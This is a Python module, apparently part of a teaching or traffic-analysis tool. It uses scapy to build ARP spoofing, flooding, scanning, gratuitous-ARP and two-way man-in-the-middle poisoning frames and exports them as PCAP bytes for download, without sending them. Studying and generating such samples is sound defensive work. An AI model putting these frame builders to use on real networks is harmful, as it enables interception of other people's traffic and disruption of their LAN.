"""
模块二：ARP 攻击流构造
手动构造以下攻击类型（理解协议细节）：
1. ARP 欺骗 (Spoofing)
2. ARP 泛洪 (Flooding)
3. ARP 扫描 (Scanning)
4. 无故 ARP 滥用 (Gratuitous ARP Abuse)
5. ARP 中间人攻击 (Man-in-the-Middle)
"""

import random
from scapy.all import Ether, ARP
from typing import List, Dict, Any

try:
    from scapy.utils import PcapWriter
except ImportError:
    PcapWriter = None


def build_arp_spoof_packets(
    target_ip: str,
    target_mac: str,
    spoof_ip: str,
    attacker_mac: str = "aa:bb:cc:dd:ee:ff"
) -> List:
    """构造 ARP 欺骗包：向 target_mac 宣称 spoof_ip 对应 attacker_mac"""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac
    )
    return [pkt]


def build_arp_flood_packets(
    iface: str,
    count: int = 1000,
    src_ip_base: str = "192.168.1"
) -> List:
    """构造 ARP 泛洪包：大量随机 MAC/IP 的 ARP Request"""
    packets = []
    for i in range(count):
        rand_ip = f"{src_ip_base}.{random.randint(1, 254)}"
        rand_mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
        pkt = Ether(src=rand_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=1,
            hwsrc=rand_mac,
            psrc=rand_ip,
            pdst="192.168.1.1"
        )
        packets.append(pkt)
    return packets


def build_arp_scan_packets(
    network: str = "192.168.1",
    start: int = 1,
    end: int = 254
) -> List:
    """构造 ARP 扫描包：对整个网段发送 ARP Who-has 请求"""
    packets = []
    for i in range(start, end + 1):
        target_ip = f"{network}.{i}"
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip)
        packets.append(pkt)
    return packets


def build_gratuitous_arp_packets(
    ip: str,
    mac: str,
    count: int = 10
) -> List:
    """构造无故 ARP 滥用包：未经请求广播自己的 IP-MAC 映射"""
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=1,
        hwsrc=mac,
        psrc=ip,
        pdst=ip,
        hwdst="ff:ff:ff:ff:ff:ff"
    )
    return [pkt] * count


def build_mitm_arp_packets(
    victim1_ip: str, victim1_mac: str,
    victim2_ip: str, victim2_mac: str,
    attacker_mac: str = "aa:bb:cc:dd:ee:ff"
) -> Dict[str, Any]:
    """构造双向 ARP 中间人攻击包"""
    pkt_to_v1 = Ether(dst=victim1_mac) / ARP(
        op=2,
        pdst=victim1_ip, hwdst=victim1_mac,
        psrc=victim2_ip, hwsrc=attacker_mac
    )
    pkt_to_v2 = Ether(dst=victim2_mac) / ARP(
        op=2,
        pdst=victim2_ip, hwdst=victim2_mac,
        psrc=victim1_ip, hwsrc=attacker_mac
    )
    return {
        "to_victim1": pkt_to_v1,
        "to_victim2": pkt_to_v2,
        "description": f"MITM: Intercepting traffic between {victim1_ip} and {victim2_ip}"
    }


def get_pcap_bytes(packets: List) -> bytes:
    """将构造的数据包序列化为 PCAP 字节（用于前端下载）"""
    import io
    import tempfile
    from scapy.all import wrpcap
    if PcapWriter:
        buf = io.BytesIO()
        writer = PcapWriter(buf, append=False, sync=True)
        for pkt in packets:
            writer.write(pkt)
        return buf.getvalue()
    with tempfile.NamedTemporaryFile(suffix=".pcap", delete=False) as f:
        tmp = f.name
    try:
        wrpcap(tmp, packets)
        with open(tmp, "rb") as f:
            return f.read()
    finally:
        import os
        os.unlink(tmp)
